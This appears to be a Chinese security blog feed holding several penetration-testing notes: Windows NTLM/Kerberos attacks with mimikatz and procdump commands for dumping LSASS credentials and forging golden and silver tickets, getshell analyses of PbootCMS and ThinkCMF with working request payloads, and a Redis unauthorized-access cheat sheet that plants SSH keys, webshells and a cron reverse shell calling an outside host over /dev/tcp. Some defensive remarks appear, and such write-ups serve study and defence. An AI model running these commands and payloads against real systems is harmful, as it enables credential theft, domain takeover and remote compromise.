<li>当我们登录系统的时候，系统会自动读取SAM文件中的&quot;密码&quot;与输入密码进行对比</li>
</ul>
<h3 id="ntlm-hash-nt-lan-manager"><strong>NTLM Hash</strong> (NT LAN Manager)</h3>
<ul>
<li>NTLM Hash是支持Net NTLM认证协议以及本地认证过程中的一个重要参与物，长度为32，由数字与字母组成。</li>
<li>Windows本身不存储用户明文密码，它会将用户的明文经过加密算法后存储在SAM数据库中</li>
<li>当用户登录时，明文也会加密成NTLM Hash，与SAM密码进行对比。NTLM Hash的前身是LM Hash，目前基本淘汰了（<strong>Windows Server 2008以前的系统还会用</strong>），但是依然存在</li>
</ul>
<p>NTLM Hash的产生：<br>
<code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
<p>LM Hash的产生：<br>
小写转大写 -&gt; 转化为16进制分成2组，填充为14个字符 -&gt; 分成两组7字节的块 -&gt; 每组转化为比特流，不足56Bit在左边加0 -&gt; 将比特流按7比特一组，分出8组，末尾加0</p>
<h3 id="本地认证流程图">本地认证流程图</h3>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1592410797128.png" alt="" loading="lazy"></figure>
<h2 id="2-windows网络认证-中间人攻击还没搞懂">2. Windows网络认证 - 中间人攻击还没搞懂</h2>
<p>常见服务： SMB服务（端口445）</p>
<h3 id="ntlm协议">NTLM协议</h3>
<blockquote>
<p>早期SMB协议明文传输。后来出现LM协议（Challenge/Response机制），到后来的NTLM机制，现在以及更新了NTLMv2以及Kerberos(域环境下)验证体系</p>
</blockquote>
<h4 id="挑战响应机制">挑战/响应机制</h4>
<ol>
<li>协商（确认协议版本）</li>
<li>质询
<ul>
<li>客户端向服务器端发送用户信息（用户名）请求</li>
<li>服务器接受到请求，生成一个16位的随机数，被称为&quot;Challenge&quot;，使用用户名对应的NTLM Hash机密Challenge（16位随机字符），生成Chanllenge1。同时，生成Challenge1后，将Challenge1发送给客户端。 // Net NTLM Hash = NTLM Hash(Challenge)</li>
<li>客户端接受到Chanllege后，同样的方式进行加密，返回Response</li>
<li>服务器端进行对比认证</li>
</ul>
</li>
</ol>
<p>流程图：<br>
<img src="https://chriskalix.github.io/post-images/1592410807643.png" alt="" loading="lazy"></p>
<h3 id="ntlm-v2协议">NTLM v2协议</h3>
<p>区别点：</p>
<ul>
<li>NTLM v1和v2的区别就是Changllenge与加密算法不同，但用的都是NTLM Hash作为原料</li>
<li>v1的Challenge 8位，v2为16位</li>
<li>v1加密算法是Des，v2是HMAC-MD5</li>
</ul>
<p><strong>工具</strong>：<br>
<code>Responder</code> | <code>smbexec</code> | <code>Inveigh</code></p>
<h2 id="3-pthpass-the-hash哈希传递">3. <strong>PTH</strong>(Pass the hash)哈希传递</h2>
<blockquote>
<p>内网渗透中，经常需要抓取管理员密码，NTLM Hash，尤其是在域环境下，能帮助我们扩大战果</p>
</blockquote>
<ul>
<li>什么是PTH<br>
是一个不需要账户明文密码就能完成认证的一个技术</li>
<li>作用<br>
获取不到密码，破解不了NTLM Hash又想要扩大战果的问题</li>
</ul>
<h3 id="必要条件">必要条件</h3>
<ol>
<li>网络互达</li>
<li>需要用户名</li>
<li>需要NTLM Hash</li>
</ol>
<p>问：为什么需要用户名?<br>
答：NTLM协议需要用户名，服务端需要用户名然后去读取</p>
<h3 id="工具">工具</h3>
<p><code>Smbmap</code> | <code>CrackMapExec</code> |  <code>Smbexec</code> | <code>Metasploit</code></p>
<h3 id="相关问题">相关问题</h3>
<p>如何使用 NTLMv1/v2（或者不常用的netNTLM）哈希进行传递哈希攻击？ @leesoh 坑人的问题，这些哈希都不能传递:&gt;</p>
<h3 id="对应pth的手法问题">对应PTH的手法&amp;问题</h3>
<p>对应手法：</p>
<pre><code>LAPS
</code></pre>
<p>kb2871997：</p>
<pre><code>内容 : 禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、PSEXEC、schtasks、at和访问文件共享
这个补丁发布后常规的Pass The Hash已经无法成功，唯独默认的 Administrator (SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程连接
</code></pre>
<h2 id="4-kerberos认证机制非常重点">4. <strong>Kerberos认证机制</strong>(非常重点)</h2>
<blockquote>
<p>Kerberos是一种网络认证协议，不基于主机安全</p>
</blockquote>
<h3 id="域认证所有角色">域认证所有角色</h3>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Centor) = DC</li>
</ul>
<h3 id="详细流程图">详细流程图</h3>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1592410833529.png" alt="" loading="lazy"></figure>
<h2 id="5-pttpass-the-ticket攻击">5. PTT(Pass The Ticket)攻击</h2>
<blockquote>
<p>在了解完上述Kerberos后，这边自然地引申出PTT攻击（票据传递攻击）</p>
</blockquote>
<h3 id="golden-ticket-黄金票据">Golden Ticket (黄金票据)</h3>
<blockquote>
<p>该票据的利用条件是原先已成功取得域用户的HASH，尤其是krbtgt这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
</blockquote>
<p>利用krbtgt的HASH值可以伪造生成任意的TGT,能够绕过对任意用户的账号策略，能够让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
<h4 id="前提条件">前提条件</h4>
<p>域名称<br>
域SID<br>
域krbtgt的hash（意味着你已经有域控权限）<br>
伪造的用户名（任意用户或者不存在的用户）</p>
<h4 id="操作步骤">操作步骤</h4>
<blockquote>
<p>使用工具<code>mimikatz</code>(落地有杀软的话基本是杀的死死的，需要找个免杀版本)</p>
</blockquote>
<pre><code class="language-txt">还看到了用procdump.exe的，拖完拉到本地做
procdump64.exe -accepteula -ma lsass.exe 存放路径\文件名
mimikatz # sekurlsa::minidump 文件名
mimikatz # sekurlsa::logonPasswords full
</code></pre>
<p>Mimikatz的操作：</p>
<ol>
<li>提取域用户krbtgt的NTLM Hash<br>
<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code></li>
<li>查看域内所有用户的hash<br>
<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></li>
<li>获取域sid<br>
<code>whoami /all</code></li>
<li>生成黄金票据<br>
方法一：用AES256生成<br>
<code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
方法二：用NTLM Hash<br>
<code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
在倾旋的视频里是：<br>
<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></li>
</ol>
<h4 id="防御">防御</h4>
<ol>
<li>经常更换KRBTGT密码</li>
<li>不允许域管账户登录其他服务器</li>
</ol>
<p>Msf的操作：<br>
用<code>golden_ticket_create</code>生成，在<code>meterpreter</code>里。使用的时候使用kerberos_ticket_use</p>
<h3 id="silver-ticket白银票据">Silver Ticket(白银票据)</h3>
<blockquote>
<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信。这篇<a href="https://www.cnblogs.com/backlion/p/8119013.html">文章</a>挺好的</p>
</blockquote>
<h4 id="白银票据特点">白银票据特点</h4>
<ol>
<li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名</li>
<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务</li>
<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
<li>攻击者需要服务帐户密码哈希值</li>
<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过</li>
<li>任何事件日志都在目标服务器上</li>
</ol>
<h4 id="前提条件-2">前提条件</h4>
<p>域名称<br>
域的SID<br>
域中Server服务器账户的NTLM-Hash<br>
伪造任意的用户名</p>
<h4 id="操作步骤-2">操作步骤</h4>
<blockquote>
<p>同样的，老朋友Mimiktaz了</p>
</blockquote>
<p>Mimikatz:</p>
<ul>
<li>kerberos::list  查看票据</li>
<li>kerberos::purge 清楚票据</li>
</ul>
<ol>
<li>导出hash<br>
mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;<br>
或者 mimiktaz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt</li>
<li>生成Sliver Ticket<pre><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型}  /rc4:{NTLM Hash}  /user:{用户名} /ptt&quot; exit
Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大
</code></pre>
还有一些其他的服务
<table>
<thead>
<tr>
<th style="text-align:right">务名称</th>
<th style="text-align:center">需要的服务</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">MI</td>
<td style="text-align:center">HOST、RPCSS</td>
</tr>
<tr>
<td style="text-align:right">owerShell Remoting</td>
<td style="text-align:center">HOST、HTTP</td>
</tr>
<tr>
<td style="text-align:right">inRM</td>
<td style="text-align:center">HOST、HTTP</td>
</tr>
<tr>
<td style="text-align:right">cheduled Tasks</td>
<td style="text-align:center">HOST</td>
</tr>
<tr>
<td style="text-align:right">indows File Share</td>
<td style="text-align:center">CIFS</td>
</tr>
<tr>
<td style="text-align:right">DAP、<strong>DCSync</strong></td>
<td style="text-align:center">LDAP</td>
</tr>
<tr>
<td style="text-align:right">indows Remote Server</td>
<td style="text-align:center">RPCSS、LDAP、CIFS</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h4 id="针对白银票据的防御">针对白银票据的防御</h4>
<p>开启PAC特权属性证书保护功能，PAC即是在步骤五收到了请求后，认证Client端发来的PAC(Privileged Attribute Certificate)。开启方式：将注册表中<code>HKEY_LOCAL\MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code>中的<code>ValidateKdcPacSignature</code>设置为1</p>
<h2 id="6-windows-access-token简介">6. Windows Access Token简介</h2>
<blockquote>
<p>Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程的时候会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限</p>
</blockquote>
<ul>
<li>一般情况下，用户双击运行一个程序，都会拷贝 &quot;explorer.exe&quot;的<code>Access Token</code>（问题：explorer.exe）</li>
<li>Access Token一般分为主令牌和模拟令牌</li>
<li><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除</strong></li>
</ul>
<h3 id="windows-access-token产生过程">Windows Access Token产生过程</h3>
<p>每个进程创建时都会根据登录绘画权限，由LSA（Local Security Authority）分配一个Token（如果CreateProcess时指定了Token，则会使用该Token，否则用父进程的Token拷贝）</p>
<h3 id="windows-access-token令牌假冒实战">Windows Access Token令牌假冒实战</h3>
<ul>
<li>Incognito(在Metasploit下集成，在meterpreter中直接load进来)<br>
list_tokens -u<br>
impersonate_token &quot;xxx\xxx&quot;</li>
<li>Powershell - Invoke - TokenManipulation.ps1</li>
<li>Cobalt Strike - steal_token</li>
</ul>
<h3 id="防御-2">防御</h3>
<p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从而控制DC。想要清楚假冒，重启即可</p>
<h2 id="7-扩展">7. 扩展</h2>
<p>SPN扫描(20200618等待扩展ing)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Pbootcms v2.0.7 Getshell分析]]></title>
        <id>https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/">
        </link>
        <updated>2020-06-14T04:50:43.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>前言: 上个月团队中的奶权审计了PbootCMS，里面一些细节还是挺有意思的，于是跟风(跟着他的文章)，一起看一看。</p>
</blockquote>
<h2 id="分析">分析</h2>
<h3 id="后台任意文件读取">后台任意文件读取</h3>
<p><code>apps/admin/controller/system/UpgradeController.php</code>下的update函数，下面为触发点相关代码</p>
<pre><code class="language-php">public function update()
{
    if ($_POST) {
        if (! ! $list = post('list')) {
            $list = explode(',', $list);
            $backdir = date('YmdHis');
            // 分离文件
            foreach ($list as $value) {
                // 过滤掉相对路径
                $value = preg_replace('/\.\.(\/|\\\)/', '', $value);
                if (stripos($value, '/script/') !== false) {
                    $sqls[] = $value;
                }
            ...
            // 更新数据库
            if (isset($sqls)) {
                $db = new DatabaseController();
                switch (get_db_type()) {
                    case 'sqlite':
                        copy(DOC_PATH . $this-&gt;config('database.dbname'), DOC_PATH . STATIC_DIR . '/backup/sql/' . date('YmdHis') . '_' . basename($this-&gt;config('database.dbname')));
                        break;
                    case 'mysql':
                        $db-&gt;backupDB();
                        break;
                }
                sort($sqls); // 排序
                foreach ($sqls as $value) {
                    $path = RUN_PATH . '/upgrade' . $value;
                    if (file_exists($path)) {
                        $sql = file_get_contents($path);
                        if (! $this-&gt;upsql($sql)) {
                            $this-&gt;log(&quot;数据库 $value 更新失败!&quot;);
                            json(0, &quot;数据库&quot; . basename($value) . &quot; 更新失败！&quot;);
                        }
                    } else {
                        json(0, &quot;数据库文件&quot; . basename($value) . &quot;不存在！&quot;);
                    }
                }
            }
            ...
}
</code></pre>
<p>在注释<code>更新数据库</code>下，关键函数<code>file_get_contents</code>。遍历<code>$sqls</code>变量，读取文件。其中<code>$sqls</code>变量由POST传递，需要包含<code>/script/</code>才能够被赋值<br>
跟进看一下<code>upsql($sql)</code>函数</p>
<pre><code class="language-php">private function upsql($sql)
{
    $sql = explode(';', $sql);
    $model = new Model();
    foreach ($sql as $value) {
        $value = trim($value);
        if ($value) {
            $model-&gt;amd($value);
        }
    }
    return true;
}
</code></pre>
<p><code>$sql</code>参数传入，调用Model类下的amd方法，继续跟进，在<code>/core/database/Sqlite.php</code>下找到函数，如下</p>
<pre><code class="language-php">public function amd($sql)
{
    $result = $this-&gt;query($sql, 'master');
    if ($result) {
        return $result;
    } else {
        return 0;
    }
}
</code></pre>
<p>跟进看query方法</p>
<pre><code class="language-php">public function query($sql, $type = 'master')
{
    $time_s = microtime(true);
    if (! $this-&gt;master || ! $this-&gt;slave) {
        $cfg = ROOT_PATH . Config::get('database.dbname');
        $conn = $this-&gt;conn($cfg);
        $this-&gt;master = $conn;
        $this-&gt;slave = $conn;
    }
    switch ($type) {
        case 'master':
            if (! $this-&gt;begin) { // 存在写入时自动开启显式事务，提高写入性能
                $this-&gt;master-&gt;exec('begin;');
                $this-&gt;begin = true;
            }
            $result = $this-&gt;master-&gt;exec($sql) or $this-&gt;error($sql, 'master');
            break;
        case 'slave':
            $result = $this-&gt;slave-&gt;query($sql) or $this-&gt;error($sql, 'slave');
            break;
    }
    return $result;
}
</code></pre>
<p>跟进error方法</p>
<pre><code class="language-php">protected function error($sql, $conn)
    {
        $err = '错误：' . $this-&gt;$conn-&gt;lastErrorMsg() . '，';
        if ($this-&gt;begin) { // 存在显式开启事务时进行回滚
            $this-&gt;master-&gt;exec('rollback;');
            $this-&gt;begin = false;
        }
        error('执行SQL发生错误！' . $err . '语句：' . $sql);
    }
}
</code></pre>
<p>可以看到error最终会被展示出来。最终的payload为(只支持windows下)</p>
<pre><code class="language-txt">URL: http://pbootcms/admin.php?p=/Upgrade/update
POST: list=/script/../../../config/database.php
</code></pre>
<p>这边有一个小trick，windows下支持不存在的路径上跳，而linux下是支持的</p>
<p>再回头看一下上面的判断条件</p>
<pre><code class="language-php">if (stripos($value, '/script/') !== false)
</code></pre>
<p>可以看到只要有<code>/script/</code>出现即可，所以需要在linux下找到相关目录(好像没有固定的，所以还是在windows下比较适用)</p>
<h3 id="模板注入">模板注入</h3>
<p>这边用到的trick在之前的文章中有过整理，所以简单地过一下先。同样想法和思路是先追溯敏感函数，其中找到eval在<code>apps/home/controller/ParseController.php</code>下，找到具体函数，部分代码如下所示：</p>
<pre><code class="language-php">public function parserIfLabel($content)
{
    $pattern = '/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
    $pattern2 = '/pboot:([0-9])+if/';
    if (preg_match_all($pattern, $content, $matches)) {
        $count = count($matches[0]);
        for ($i = 0; $i &lt; $count; $i ++) {
            $flag = '';
            $out_html = '';
            $danger = false;
            
            $white_fun = array(
                'date',
                'in_array',
                'explode',
                'implode'
            );
            
            // 还原可能包含的保留内容，避免判断失效
            $matches[1][$i] = $this-&gt;restorePreLabel($matches[1][$i]);
            
            // 解码条件字符串
            $matches[1][$i] = decode_string($matches[1][$i]);
            
            // 带有函数的条件语句进行安全校验
            if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)) {
                foreach ($matches2[1] as $value) {
                    if ((function_exists($value) || preg_match('/^eval$/i', $value)) &amp;&amp; ! in_array($value, $white_fun)) {
                        $danger = true;
                        break;
                    }
                }
            }
            
            // 过滤特殊字符串
            if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i', $matches[1][$i])) {
                $danger = true;
            }
            
            // 如果有危险函数，则不解析该IF
            if ($danger) {
                continue;
            }
            
            eval('if(' . $matches[1][$i] . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}');
            ...
</code></pre>
<p>作者提到了两种方法，一为上传图片马再通过<code>include()</code>函数包含，第二就是下面提到的简单一些的通用方法。<br>
跟着代码读一下，其实就是将传入的模板进行过滤，过滤掉特殊字符串。在我整理的PHP后门那个文章中提到了这个的绕过方法。这里的具体应用即为使用<code>chr%01(xxx)</code>这种形式(即函数+控制字符+参数)的形式绕过。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Thinkcmf 2.x Getshell分析]]></title>
        <id>https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/">
        </link>
        <updated>2020-06-14T04:40:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="环境">环境</h2>
<p>windows<br>
phpstudy (php7.2.9)<br>
thinkcmf 2.2.2</p>
<h2 id="具体分析">具体分析</h2>
<p>首先在<code>index.php</code>中定义了项目路径为<code>application/</code><br>
在入口点控制器<code>application/Portal/Controller/IndexController.class.php</code>中只定义了一个index函数，但是因为继承了<code>HomebaseController</code>类，可以调用<code>HomebaseController</code>中属性为public的函数<br>
跟进<code>application/Common/Controller/HomebaseController.class.php</code>，其中需要关注的是两个函数，分别为display以及fetch</p>
<h3 id="getshell方法1">Getshell方法1</h3>
<p>通过display方法getshell</p>
<pre><code class="language-php">/**
    * 加载模板和页面输出 可以返回输出内容
    * @access public
    * @param string $templateFile 模板文件名
    * @param string $charset 模板输出字符集
    * @param string $contentType 输出类型
    * @param string $content 模板输出内容
    * @return mixed
    */
public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') {
    parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);
}
</code></pre>
<p><code>display</code>函数的注释中也提及了，用于加载模板和页面输出，这里存在的是任意文件包含漏洞。<br>
这里使用a参数指定方法，传入<code>templateFile</code>参数可直接完成本地包含，本地测试payload为<code>?a=display&amp;templateFile=README.md</code><br>
那么如何Getshell呢？Sp4ce师傅的<a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw">文章</a>中使用的是通过报错的方法，将shell写入当天的日志，然后通过包含日志执行写入shell，然后连接shell即可</p>
<p>这边讲的稍微浅一点，在Getshell方法2中补全</p>
<h3 id="getshell方法2">Getshell方法2</h3>
<p>通过fetch方法</p>
<pre><code class="language-php">/**
    * 获取输出页面内容
    * 调用内置的模板引擎fetch方法，
    * @access protected
    * @param string $templateFile 指定要调用的模板文件
    * 默认为空 由系统自动定位模板文件
    * @param string $content 模板输出内容
    * @param string $prefix 模板缓存前缀*
    * @return string
    */
public function fetch($templateFile='',$content='',$prefix=''){
    $templateFile = empty($content)?$this-&gt;parseTemplate($templateFile):'';
    return parent::fetch($templateFile,$content,$prefix);
}
</code></pre>
<h4 id="深入查看">深入查看</h4>
<p>大多数的文章一般就是引用一下<code>payload</code>手动复现，之前我也没有看过thinkcmf这个框架，只是看别人文章里说的，是基于<code>thinkphp3.x</code>封装的，决定静态的去跟踪一下，深入理解。<br>
<code>parent::fetch</code>调用父类的fetch，看下函数定义<code>class HomebaseController extends AppframeController</code>，在<code>AppframeController</code>下并无fetch方法，继续查看，发现就是调用了Think模块下的Controller</p>
<pre><code class="language-php">namespace Common\Controller;
use Think\Controller;
class AppframeController extends Controller
</code></pre>
<p>所以fetch函数本质上就是从Thinkphp的Controller中抽象出来，没有其他区别。继续跟进<code>simplewind/Core/Library/Think/Controller.class.php</code>，函数如下</p>
<pre><code class="language-php">protected function fetch($templateFile='',$content='',$prefix='') {
    return $this-&gt;view-&gt;fetch($templateFile,$content,$prefix);
}
</code></pre>
<p>调用了view下的fetch，找到在<code>__construct()</code>中被初始化</p>
<pre><code class="language-php">public function __construct() {
    Hook::listen('action_begin',$this-&gt;config);
    //实例化视图类
    $this-&gt;view     = Think::instance('Think\View');
    //控制器初始化
    if(method_exists($this,'_initialize'))
        $this-&gt;_initialize();
}
</code></pre>
<p>继续跟进，为<code>simplewind/Core/Library/Think/View.class.php</code>，第106行找到fetch函数，如下所示</p>
<pre><code class="language-php">public function fetch($templateFile='',$content='',$prefix='') {
    if(empty($content)) {
        $templateFile   =   $this-&gt;parseTemplate($templateFile);
        // 模板文件不存在直接返回
        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
    }else{
        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
    }
    // 页面缓存
    ob_start();
    ob_implicit_flush(0);
    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
        $_content   =   $content;
        // 模板阵列变量分解成为独立变量
        extract($this-&gt;tVar, EXTR_OVERWRITE);
        // 直接载入PHP模板
        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
    }else{
        // 视图解析标签
        $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
        Hook::listen('view_parse',$params);
    }
    // 获取并清空缓存
    $content = ob_get_clean();
    // 内容过滤标签
    Hook::listen('view_filter',$content);
    // 输出模板文件
    return $content;
}
</code></pre>
<p><code>Getshell方法1</code>的函数也在这个文件下。找到真正的fetch函数，分析一下。<br>
这里有一些函数是thinkphp中自带的几个较为重要的函数，如fetch函数中的E，L，C。翻阅了一下资料，做一个简单补充。<br>
C方法：简单的理解为Config，即是用于设置、获取、以及保存配置参数的方法。其中的C('TMPL_ENGINE_TYPE')即为获取配置值<br>
E方法：即为Error，具体就为throw new Think\Exception($msg, $code);<br>
L方法：代表Language，用于获得语言变量</p>
<p>回到fetch函数继续进行分析。fetch函数下较为简单，只是两个if语句判断。</p>
<p>第一个if语句判断是否传入<code>$content</code>参数。第二处判断<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>，下断点调试后得到<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>的值为think，走到else分支。不太了解的是Hook::listen，故去检索。文章中提到，<code>Hook::listen</code>通过遍历某个行为标签的所有行为，依次实例化并且调用run方法。找到最終将<code>$param</code>参数传入<code>simplewind/Core/Library/Behavior/ParseTemplateBehavior.class.php</code>，找到其中run方法，如下所示：</p>
<pre><code class="language-php">public function run(&amp;$_data){
    $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
    $_content           =   empty($_data['content'])?$_data['file']:$_data['content'];
    $_data['prefix']    =   !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX');
    if('think'==$engine){ // 采用Think模板引擎
        if((!empty($_data['content']) &amp;&amp; $this-&gt;checkContentCache($_data['content'],$_data['prefix'])) 
            ||  $this-&gt;checkCache($_data['file'],$_data['prefix'])) { // 缓存有效
            //载入模版缓存文件
            Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);
        }else{
            $tpl = Think::instance('Think\\Template');
            // 编译并加载模板文件
            $tpl-&gt;fetch($_content,$_data['var'],$_data['prefix']);
        }
    }else{
        // 调用第三方模板引擎解析和输出
        if(strpos($engine,'\\')){
            $class  =   $engine;
        }else{
            $class   =  'Think\\Template\\Driver\\'.ucwords($engine);
        }
        if(class_exists($class)) {
            $tpl   =  new $class;
            $tpl-&gt;fetch($_content,$_data['var']);
        }else {  // 类没有定义
            E(L('_NOT_SUPPORT_').': ' . $class);
        }
    }
}
</code></pre>
<p>即是一个嵌套判断。首先<code>$engine</code>为think，走进第一层if判断中。<code>$_data['content']</code>不为empty，<code>$this-&gt;checkContentCache</code>为False，<code>$this-&gt;checkCache</code>也为false，走到else分支。(这边就不再详细跟进具体函数，不然太长了)。之后执行两个操作，<code>Think::instance('Think\\Template')以及$tpl-&gt;fetch($_content,$_data['var'],$_data['prefix'])</code>。</p>
<p>跟进fetch，具体为</p>
<pre><code class="language-php">public function fetch($templateFile,$templateVar,$prefix='') {
    $this-&gt;tVar         =   $templateVar;
    $templateCacheFile  =   $this-&gt;loadTemplate($templateFile,$prefix);
    Storage::load($templateCacheFile,$this-&gt;tVar,null,'tpl');
}
</code></pre>
<p>在<code>$this-&gt;loadTemplate</code>的时候写入了缓存模板文件。</p>
<p>调用<code>Storage::load</code>，如下</p>
<pre><code class="language-php">public function load($_filename,$vars=null){
    if(!is_null($vars)){
        extract($vars, EXTR_OVERWRITE);
    }
    include $_filename;
}
</code></pre>
<p>再通过include包含进来，执行php代码。以上都是跟着文章中的payload一步步调试跟进。其实到thinkcmf抽象的fetch之后的，都算是Thinkphp的问题吧...</p>
<h4 id="payload">payload</h4>
<p>在index路径下写入<code>phpinfo()</code>的payload为</p>
<pre><code class="language-txt">?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('test.php','&lt;?php phpinfo(); ?&gt;')&lt;/php&gt;
</code></pre>
<h2 id="知识点困惑点">知识点&amp;困惑点</h2>
<p>很多文章中都提及到了thinkphp中的g\m\a，即分组\控制器\方法。文中提及到的方法均为通过直接使用方法去调用父类的public函数。困惑的地方为官方文档中提及到的，也有m\c\a这个概念，即module\controller\application(总觉得好像是一样的，暂时先埋个坑，后续我再去翻阅文档)</p>
<h2 id="修复">修复</h2>
<p>将display和fetch两个函数都改为protected</p>
<h2 id="参考文章">参考文章</h2>
<p><a href="https://xz.aliyun.com/t/6626#toc-5">先知文章</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Redis攻击备忘录]]></title>
        <id>https://chriskalix.github.io/post/redis-gong-ji-bei-wang-lu/</id>
        <link href="https://chriskalix.github.io/post/redis-gong-ji-bei-wang-lu/">
        </link>
        <updated>2020-06-14T04:28:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="redis未授权访问的利用">REDIS未授权访问的利用</h2>
<blockquote>
<p>目前比较全的<a href="https://paper.seebug.org/975/">文章</a></p>
</blockquote>
<h3 id="linux下的利用">Linux下的利用</h3>
<pre><code class="language-txt">在linux下的利用主要有三种

1. 写入ssh公钥
2. 写crontab
3. 写webshell

用redis-cli

[*] 注意:redis敏感，注意客户环境，不要覆盖客户的变量数据，更不要清空，小心操作
</code></pre>
<h4 id="1-写ssh公钥">1. 写ssh公钥</h4>
<pre><code class="language-txt">条件：

1. 目标开启ssh，且允许密钥登录
2. Redis使用root账号启动

步骤如下：

1. `ssh-keygen -t rsa`在本地生成ssh密钥对，本机是root，所以生成在`/root/.ssh/`目录下，id_rsa为私钥，id_rsa.pub为公钥。
2. redis执行命令，`config set dir /root/.ssh/`将目录切换到`/root/.ssh/`，执行`config set dbfilename authorized_keys`，再将public_key写入变量后执行save。对于写入key:`(echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt`，然后再`cat 1.txt | redis-cli -h xx.xx.xx.xx -x set test`，然后进入执行`save test`，便可以进行登录。
</code></pre>
<h4 id="2-写定时任务">2. 写定时任务</h4>
<pre><code class="language-txt">条件：
需要装有定时任务(有一次进入服务器内没有定时任务)
有写的权限

1. 设置变量 `set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;`
2. 切换路径 `config set dir /var/spool/cron/`
3. 设置文件名 `config set dbfilename root`
4. 保存至文件 `save`
</code></pre>
<h4 id="3-写webshell">3. 写webshell</h4>
<pre><code class="language-txt">条件：
有写的权限
知道网站的绝对路径

1. 设置路径 `config set dir /var/www/html/`
2. 设置文件名 `config set dbfilename shell.php`
3. 设置变量 `set x &quot;&lt;?php phpinfo();?&gt;&quot;`
4. 保存变量 `save`
</code></pre>
<h3 id="windows下的利用">windows下的利用</h3>
<h4 id="1-写webshell同上">1. 写webshell（同上）</h4>
<h4 id="2-写启动项">2. 写启动项</h4>
<pre><code class="language-txt">C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/
</code></pre>
<h3 id="坑点">坑点</h3>
